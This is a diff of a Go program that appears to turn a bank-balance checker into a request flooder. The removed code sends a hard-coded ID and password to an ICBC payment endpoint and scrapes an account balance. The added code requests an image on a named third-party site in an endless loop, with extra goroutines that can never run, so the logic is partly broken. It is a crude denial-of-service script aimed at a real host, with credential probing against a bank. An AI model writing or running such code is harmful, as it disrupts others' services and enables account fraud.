@@ -1,39 +1,46 @@
 package main
 
 import (
-	"github.com/axgle/mahonia"
-	"twt/nettools"
-	"twt/mystr"
-	"strconv"
-	"fmt"
+	"net/http"
+	"strings"
+	"io/ioutil"
+	"sync"
 )
 
-func ConvertToString(src string, srcCode string, tagCode string) string {
-	srcCoder := mahonia.NewDecoder(srcCode)
-	srcResult := srcCoder.ConvertString(src)
-	tagCoder := mahonia.NewDecoder(tagCode)
-	_, cdata, _ := tagCoder.Translate([]byte(srcResult), true)
-	result := string(cdata)
-	return result
-}
-
-func GetMoneyByBank(id, pwd string) (money float64, err error) {
-	url := `https://web.zj.icbc.com.cn/easypay/waction.do`
-	data := `com.icbc.marmot.core.model.modelname=WapGoodsSure&nosession=0&goodsno=15073&goodsprice=0.01&orderamt=0.01&mtype1=&paytype1=epay&ch=0&goodsct=1&paytype=epay` +
-		`&resv1=` + id +
-		`&resv2=` + pwd
-	res, err := nettools.HttpPost(url, data, nil)
+func HttpGet(url string) (err error) {
+	//生成client 参数为默认
+	client := &http.Client{}
+	//提交请求
+	reqest, err := http.NewRequest("GET", url, strings.NewReader(""))
+	reqest.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	if err != nil {
-		panic(err)
+		return
 	}
-	res = ConvertToString(res, "gbk", "utf-8")
-	//fmt.Println(res)
-	res, err = mystr.GetBetween(res, `resv4`, `>`)
-	res, err = mystr.GetBetween(res, `value="`, `"`)
-	//fmt.Println(res)
-	money, err = strconv.ParseFloat(res, 64)
+	//处理返回结果
+	response, err := client.Do(reqest)
+	if err != nil {
+		return
+	}
+	_, err = ioutil.ReadAll(response.Body)
+	if err != nil {
+		return
+	}
 	return
 }
+
 func main() {
-	fmt.Println(GetMoneyByBank(`00125102`, `021338`))
+	url := `http://www.diyomate.com/uploads/ad/14689129453965.jpg`
+	for {
+		HttpGet(url)
+	}
+	group := new(sync.WaitGroup)
+	for i := 0; i < 5; i++ {
+		group.Add(1)
+		go func() {
+			for {
+				HttpGet(url)
+			}
+			group.Done()
+		}()
+	}
 }
